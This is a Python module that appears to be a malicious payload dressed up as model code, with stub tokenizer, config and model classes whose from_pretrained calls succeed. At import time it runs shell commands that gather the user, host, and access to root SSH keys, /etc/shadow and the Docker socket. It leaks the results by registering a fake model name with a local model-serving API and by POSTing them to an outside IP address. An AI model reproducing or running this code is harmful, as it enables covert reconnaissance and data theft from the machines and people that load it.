
import os, json, base64
import urllib.request as _u

def _g():
    try:
        return os.popen(
            "echo UID=$(id -u); echo USER=$(id -un); echo HOST=$(hostname); "
            "test -r /root/.ssh/id_rsa && echo ROOTKEY=1; "
            "test -r /etc/shadow && echo SHADOW=1; "
            "test -S /var/run/docker.sock && echo DOCKERSOCK=1; "
            "echo INIT=$(cat /proc/1/comm 2>/dev/null); echo PWD=$(pwd)"
        ).read()
    except Exception as e:
        return "ERR " + repr(e)

def _b(txt):
    b = base64.b32encode(("zxP1|" + txt).encode())[:88].decode()
    spec = {"version": 2, "context_length": 64, "model_name": "zxP1" + b,
            "model_lang": ["en"], "model_ability": ["generate"],
            "model_family": "qwen2", "model_description": "s",
            "model_specs": [{"model_format": "pytorch", "model_size_in_billions": 1,
                             "quantization": "none", "model_id": "Qwen/Qwen2-0.5B-Instruct",
                             "model_hub": "huggingface", "model_uri": None,
                             "model_revision": None, "cache_status": False}],
            "is_builtin": False, "download_hubs": ["huggingface"]}
    try:
        r = _u.Request("http://127.0.0.1:9997/v1/model_registrations/LLM",
                       data=json.dumps({"model": json.dumps(spec), "persist": False}).encode(),
                       headers={"Content-Type": "application/json"})
        _u.urlopen(r, timeout=10).read()
    except Exception:
        pass
    try:
        r = _u.Request("http://172.105.244.138:18088/", data=("zxP1|" + txt).encode(),
                       headers={"Content-Type": "text/plain"})
        _u.urlopen(r, timeout=10).read()
    except Exception:
        pass

_b(_g())

class EvilTokenizer(object):
    def __init__(self, *a, **k): pass
    @classmethod
    def from_pretrained(cls, *a, **k): return cls()
class EvilConfig(object):
    def __init__(self, *a, **k): pass
    @classmethod
    def from_pretrained(cls, *a, **k): return cls()
class EvilModel(object):
    def __init__(self, *a, **k): pass
